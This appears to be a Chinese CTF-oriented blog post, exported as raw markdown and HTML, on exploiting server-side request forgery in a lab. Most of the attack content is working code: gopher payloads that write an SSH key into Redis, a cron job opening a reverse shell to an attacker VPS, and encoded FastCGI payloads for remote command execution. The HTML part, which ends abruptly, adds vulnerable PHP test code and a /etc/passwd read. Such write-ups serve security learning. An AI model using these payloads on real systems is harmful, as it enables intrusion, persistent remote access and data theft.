写SSH公钥\n\n同样，我们也可以直接这个存在Redis未授权的主机的~/.ssh目录下写入SSH公钥，直接实现免密登录，但前提是~/.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录。\n\n构造redis命令：\n\n```\nflushall  \nset 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami  \n'  \nconfig set dir /root/.ssh/  \nconfig set dbfilename authorized\\_keys  \nsave\n```\n\n然后编写脚本，将其转化为Gopher协议的格式：\n\n```\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nssh\\_pub=\"\\\\n\\\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\\\\n\\\\n\"\nfilename=\"authorized\\_keys\"\npath=\"/root/.ssh/\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(ssh\\_pub.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\n生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去：\n\n```\nssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized\\_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A\n```\n\n如下图，成功在主机192.168.52.131上面写入SSH公钥：\n\n![image-20210113185745287](https://image.3001.net/images/20210114/1610598028_5fffc68c0f8d37e46a560.png!small)\n\n如下图，ssh连接成功：\n\n![image-20210113193746288](https://image.3001.net/images/20210114/1610598029_5fffc68d802a6e5c757d2.png!small)\n\n### 创建计划任务反弹Shell\n\n**注意：这个只能在Centos上使用，别的不行，好像是由于权限的问题。**\n\n构造redis的命令如下：\n\n```\nflushall  \nset 1 '\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1\\\\n\\\\n'  \nconfig set dir /var/spool/cron/  \nconfig set dbfilename root  \nsave  \n\n// 47.xxx.xxx.72为攻击者vps的IP\n\n然后编写脚本，将其转化为Gopher协议的格式：\n\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nreverse\\_ip=\"47.xxx.xxx.72\"\nreverse\\_port=\"2333\"\ncron=\"\\\\n\\\\n\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i >& /dev/tcp/%s/%s 0>&1\\\\n\\\\n\\\\n\\\\n\"%(reverse\\_ip,reverse\\_port)\nfilename=\"root\"\npath=\"/var/spool/cron\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(cron.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\n生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去，即可在目标主机192.168.52.131上写入计划任务，等到时间后，攻击者vps上就会获得目标主机的shell：\n\n![image-20210113184927766](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202362.jpeg)\n\n[\\[GKCTF2020\\]EZ三剑客-EzWeb](https://blog.csdn.net/qq_45521281/article/details/106532501)这道题利用的就是攻击内网Redis的思路。\n\n## 攻击内网FastCGI\n\nFastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。\n\n> 众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要**通过浏览器进行解析**，而动态网站需要一个**额外的编译解析**的过程。以Apache为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会把这个请求进行简单的处理，然后如果使用的是CGI，就会启动CGI程序（对应的就是PHP解释器）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。\n>\n> 这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它**像一个常驻的CGI**，在启动后会一直运行着，不需要每次处理数据时都启动一次，**所以FastCGI的主要行为是将CGI解释器进程保持在内存中**，并因此获得较高的性能 。\n\n### php-fpm\n\nFPM（FastCGI 进程管理器）可以说是FastCGI的一个具体实现，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。\n\n攻击FastCGI的主要原理就是，在设置环境变量实际请求中会出现一个`SCRIPT_FILENAME': '/var/www/html/index.php`这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。\n\n而在PHP 5.3.9后来的版本中，PHP增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在PHP允许通过PHP\\_ADMIN\\_VALUE和PHP\\_VALUE去动态修改PHP的设置。\n\n那么当设置PHP环境变量为：`auto_prepend_file = php://input;allow_url_include = On`时，就会在执行PHP脚本之前包含环境变量`auto_prepend_file`所指向的文件内容，`php://input`也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。\n\n详情请见：[《SSRF系列之攻击FastCGI》](https://bbs.ichunqiu.com/thread-58455-1-1.html)\n\n测试环境：\n\n![image-20210113225311760](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202250.jpeg)\n\nWEB服务器Ubuntu（192.168.43.166）存在SSRF漏洞：\n\n![image-20210113211319025](https://image.3001.net/images/20210114/1610598034_5fffc69243862a502d80a.png!small)\n\n并且WEB服务器Ubuntu上存在FastCGI，那么我们就可以利用其SSRF漏洞去攻击其本地的FastCGI。\n\n> 假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi\\_exp等工具去攻击服务器上的php-fpm实现任意代码执行。\n>\n> 当内网中的其他主机上配置有fpm，且监听的地址为0.0.0.0:9000时，那么这台主机就可能存在php-fpm未授权访问漏洞，我们便可以利用Ubuntu服务器上的SSRF去攻击他，如果内网中的这台主机不存在php-fpm未授权访问漏洞，那么就直接利用Ubuntu服务器上的SSRF去攻击他显然是不行的。\n\n### 使用fcgi\\_exp工具攻击\n\n下载地址：[https://github.com/piaca/fcgi\\_exp](https://github.com/piaca/fcgi_exp)\n\n这个工具主要是用来攻击未授权访问php-fpm的，可用来测试是否可以直接攻击php-fpm，但需要自己将生成的payload进行转换一下。\n\n该工具需要go语言环境，下载后进入目录执行如下命令进行编译：\n\ngo build fcgi\\_exp.go                    # 编译fcgi\\_exp.go\n\n编译完成后，我们在攻击机上使用`nc -lvvp 2333 > fcg_exp.txt`监听2333 端口来接收fcgi\\_exp生成的payload，另外再开启一个终端使用下面的命令来向2333端口发送payload：\n\n./fcgi\\_exp system 127.0.0.1 2333 /var/www/html/index.php \"id\"\n\n![image-20210113205718209](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202135.jpeg)\n\n生成的fcg\\_exp.txt文件的内容是接收到的payload，内容如下：\n\n![image-20210113205857913](https://image.3001.net/images/20210114/1610598036_5fffc694cc3e3da7a21ec.png!small)\n\n然后对fcg\\_exp.txt文件里的payload进行url编码，这里通过如下脚本实现（脚本是我从网上白嫖的嘿嘿）：\n\n\\# -\\*- coding: UTF-8 -\\*-  \nfrom urllib.parse import quote, unquote, urlencode  \n\nfile = open('fcg\\_exp.txt','r')  \npayload = file.read()  \nprint(\"gopher://127.0.0.1:9000/\\_\"+quote(payload).replace(\"%0A\",\"%0D\").replace(\"%2F\",\"/\"))\n\n执行上面的python脚本生成如下payload：\n\n![image-20210113210102251](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202737.jpeg)\n\n这里还要对上面的payload进行二次url编码，然后将最终的payload内容放到?url=后面发送过去：\n\n```\nssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP%2F1.1%250E%2502CONTENT\\_LENGTH56%250E%2504REQUEST\\_METHODPOST%2509%255BPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Ddisable\\_functions%2520%253D%2520%250Dsafe\\_mode%2520%253D%2520Off%250Dauto\\_prepend\\_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT\\_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT\\_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E\n```\n\n如下图所示，命令执行成功：\n\n![image-20210113211227610](https://image.3001.net/images/20210114/1610598040_5fffc6982e020c76d98d2.png!small)\n\n### 使用Gopherus工具攻击\n\n下载地址：[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)\n\n该工具可以帮你生成符合Gopher协议格式的payload，以利用SSRF攻击Redis、FastCGI、MySql等内网应用。\n\n使用Gopherus工具生成攻击FastCGI的payload：\n\npython gopherus.py --exploit fastcgi  \n/var/www/html/index.php    # 这里输入的是一个已知存在的php文件  \nid    # 输入一个你要执行的命令\n\n![image-20201206134630782](https://image.3001.net/images/20210114/1610598041_5fffc69924b889c84f935.png!small)\n\n然后还是将得到的payload进行二次url编码，将最终得到的payload放到?url=后面打过去过去：\n\n```\nssrf.php?url=gopher%3A//127.0.0.1%3A9000/\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP/1.1%250E%2502CONTENT\\_LENGTH54%250E%2504REQUEST\\_METHODPOST%2509KPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Adisable\\_functions%2520%253D%2520%250Aauto\\_prepend\\_file%2520%253D%2520php%253A//input%250F%2517SCRIPT\\_FILENAME/var/www/html/index.php%250D%2501DOCUMENT\\_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500\n```\n\n![image-20210113211649519](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202253.jpeg)\n\n命令执行成功。\n\n## 攻击内网MySql\n\n![20210113152106.png](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202474.jpeg)\n\n首先我们要先了解一下MySql数据库用户认证的过程。MySQL分为服务端和客户端。MySQL数据库用户认证采用的是 挑战/应答 的方式，即服务器生成该挑战码(scramble)并发送给客户端，客户端用挑战码将自己的密码进行加密后，并将相应的加密结果返回给服务器，服务器本地用挑战码的将用户的密码加密，如果加密的结果和用户返回的加密的结果相同则用户认证成功，从而完成用户认证的过程。\n\n登录时需要用服务器发来的挑战码(scramble)将密码加密，但是当数据库用户密码为空时，加密后的密文也为空。客户端给服务端发的认证包就是相对固定的了。这样就无需交互了，可以通过Gopher协议来直接发送了。\n\n测试环境如下：\n\n![image-20210113225607672](https://image.3001.net/images/20210114/1610598044_5fffc69c8db745aea464b.png!small)\n\nUbuntu服务器为WEB服务器，存在SSRF漏洞，且上面运行着MySql服务，用户名为whoami，密码为空并允许空密码登录。\n\n下面我们还是使用Gopherus工具生成攻击Ubuntu服务器本地MySql的payload：\n\npython gopherus.py --exploit mysql  \nwhoami    # 登录用的用户名  \nshow databases;    # 登录后要执行的sql语句\n\n生成如下payload：\n\n![image-20210114004602164](https://image.3001.net/images/20210114/1610598046_5fffc69e8d085bc01c7a3.png!small)\n\n将得到的paylaod进行url二次编码，然后将最终的payload内容放到?url=后面发送打过去就行了。但是我这里失败了，不知道为什么......\n\n## Ending......\n\n推荐一个SSRF练习靶场：\n\n+   ssrf-lab：[https://github.com/fengwenhua/ssrf-lab](https://github.com/fengwenhua/ssrf-lab)\n\n该靶场有一个好看又简洁的界面，提供了最基本的 REST API 和客户端 WebHook 功能用于 SSRF 测试。配置请看：[https://www.heibai.org/post/1287.html](https://www.heibai.org/post/1287.html)\n\n![20210112124413.jpg](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202809.jpeg)\n\n本文多为笔者的学习总结，若有不当的地方还望各位经过的路过的大佬多多点评。\n\n个人博客：[https://whoamianony.top/](https://whoamianony.top/)\n\n> 参考： [https://blog.csdn.net/Ping\\_Pig/article/details/99412487](https://blog.csdn.net/Ping_Pig/article/details/99412487)\n>\n> [https://www.cnblogs.com/iors/p/9777571.html](https://www.cnblogs.com/iors/p/9777571.html)\n>\n> [https://blog.csdn.net/qq\\_43625917/article/details/104528645?utm\\_source=app](https://blog.csdn.net/qq_43625917/article/details/104528645?utm_source=app)\n>\n> [https://xz.aliyun.com/t/2115](https://xz.aliyun.com/t/2115)\n>\n> [https://blog.csdn.net/weixin\\_36343353/article/details/112277580](https://blog.csdn.net/weixin_36343353/article/details/112277580)\n>\n> [https://blog.csdn.net/cj\\_Allen/article/details/106855893](https://blog.csdn.net/cj_Allen/article/details/106855893)\n>\n> [https://www.redteaming.top/2019/07/15/浅析Redis中SSRF的利用/#Redis配合gopher协议进行SSRF](https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis%E9%85%8D%E5%90%88gopher%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8CSSRF)\n>\n> [https://bbs.ichunqiu.com/thread-58455-1-1.html](https://bbs.ichunqiu.com/thread-58455-1-1.html)\n>\n> [https://blog.chaitin.cn/gopher-attack-surfaces/](https://blog.chaitin.cn/gopher-attack-surfaces/)\n>\n> [https://www.anquanke.com/post/id/197431#h2-6](https://www.anquanke.com/post/id/197431#h2-6)\n>\n> [https://www.anquanke.com/post/id/145519#h2-14](https://www.anquanke.com/post/id/145519#h2-14)","slug":"SSRF初探","published":1,"updated":"2024-04-25T14:08:59.837Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvfbkxtj0000vm76exfu69c3","content":"<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201984.jpeg\"\n                        alt=\"SSRF\"\n                 ></p>\n<blockquote>\n<p>FreeBuf停更好久，我都忘了自己还有一个FreeBuf账号了，嘿嘿，你们信吗？</p>\n</blockquote>\n<p>在最近一段时间的CTF中，感觉SSRF的题型又多了起来。SSRF这个漏洞也是我自己最喜欢的一个漏洞了，趁寒假没事干，便写了这篇文章总结一下SSRF的几种利用方式。本文多为笔者的学习总结，内容十分详细且丰富，大佬路过还望多多点评。</p>\n<h2 id=\"漏洞详情\"><a href=\"#漏洞详情\" class=\"headerlink\" title=\"漏洞详情\"></a>漏洞详情</h2><p>SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p>\n<p>SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p>\n<p>如下图所示，服务器Ubuntu为WEB服务器，可被攻击者访问，内网中的其他服务器无法被攻击者直接访问。假设服务器Ubuntu中的某个WEB应用存在SSRF漏洞，那我们就可以操作这个WEB服务器去读取本地的文件、探测内网主机存活、探测内网主机端口等，如果借助相关网络协议，我们还可以攻击内网中的Redis、MySql、FastCGI等应用，WEB服务器在整个攻击过程中被作为中间人进行利用。<img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small\"\n                        alt=\"image-20210112220229389\"\n                 ></p>\n<p><strong>容易出现SSRF的地方有：</strong></p>\n<blockquote>\n<ol>\n<li><p>社交分享功能：获取超链接的标题等内容进行显示</p>\n</li>\n<li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>\n</li>\n<li><p>在线翻译：给网址翻译对应网页的内容</p>\n</li>\n<li><p>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片</p>\n</li>\n<li><p>图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>\n</li>\n<li><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>\n</li>\n<li><p>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>\n</li>\n<li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>\n</li>\n<li><p>邮件系统：比如接收邮件服务器地址</p>\n</li>\n<li><p>编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>\n</li>\n<li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>\n</li>\n<li><p>从远程服务器请求资源</p>\n</li>\n</ol>\n</blockquote>\n<p><strong>SSRF漏洞的危害：</strong></p>\n<blockquote>\n<ol>\n<li><p>对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</p>\n</li>\n<li><p>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。</p>\n</li>\n<li><p>对内网Web应用进行指纹识别，识别企业内部的资产信息。</p>\n</li>\n<li><p>攻击内外网的Web应用，主要是使用HTTP GET&#x2F;POST请求就可以实现的攻击，如sql注入、文件上传等。</p>\n</li>\n<li><p>利用file协议读取服务器本地文件等。</p>\n</li>\n<li><p>进行跳板攻击等。</p>\n</li>\n</ol>\n</blockquote>\n<h2 id=\"SSRF漏洞相关函数和类\"><a href=\"#SSRF漏洞相关函数和类\" class=\"headerlink\" title=\"SSRF漏洞相关函数和类\"></a>SSRF漏洞相关函数和类</h2><ul>\n<li><p>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</p>\n</li>\n<li><p>readfile()：输出一个文件的内容。</p>\n</li>\n<li><p>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</p>\n</li>\n<li><p>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p>\n</li>\n<li><p>fopen()：打开一个文件文件或者 URL。</p>\n</li>\n<li><p>……</p>\n</li>\n</ul>\n<p>上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。</p>\n<h3 id=\"file-get-contents\"><a href=\"#file-get-contents\" class=\"headerlink\" title=\"file_get_contents()\"></a>file_get_contents()</h3><p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = $\\_GET\\[&#x27;url&#x27;\\];;</span><br><span class=\"line\">echo file\\_get\\_contents($url);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上述测试代码中，file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似<code>ssrf.php?url=../../../../../etc/passwd</code>的paylaod即可读取服务器本地的任意文件。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597996_5fffc66c9d8087b2c3242.png!small\"\n                        alt=\"image-20210112225820457\"\n                 ></p>\n<p>readfile()函数与file_get_contents()函数相似。</p>\n<h3 id=\"fsockopen\"><a href=\"#fsockopen\" class=\"headerlink\" title=\"fsockopen()\"></a>fsockopen()</h3><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$host=$\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">$fp = fsockopen($host, 80, $errno, $errstr, 30);</span><br><span class=\"line\">if (!$fp) &#123;</span><br><span class=\"line\">    echo &quot;$errstr ($errno)&lt;br /&gt;\\\\n&quot;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $out = &quot;GET / HTTP/1.1\\\\r\\\\n&quot;;</span><br><span class=\"line\">    $out .= &quot;Host: $host\\\\r\\\\n&quot;;</span><br><span class=\"line\">    $out .= &quot;Connection: Close\\\\r\\\\n\\\\r\\\\n&quot;;</span><br><span class=\"line\">    fwrite($fp, $out);</span><br><span class=\"line\">    while (!feof($fp)) &#123;</span><br><span class=\"line\">        echo fgets($fp, 128);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fclose($fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>构造<code>ssrf.php?url=www.baidu.com</code>即可成功触发ssrf并返回百度主页：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201642.jpeg\"\n                        alt=\"image-20210112230552313\"\n                 ></p>\n<h3 id=\"curl-exec\"><a href=\"#curl-exec\" class=\"headerlink\" title=\"curl_exec()\"></a>curl_exec()</h3><p>curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">if (isset($\\_GET\\[&#x27;url&#x27;\\]))&#123;</span><br><span class=\"line\">\t$link = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">\t$curlobj = curl\\_init(); // 创建新的 cURL 资源</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); // 设置 URL 和相应的选项</span><br><span class=\"line\">\t$result=curl\\_exec($curlobj); // 抓取 URL 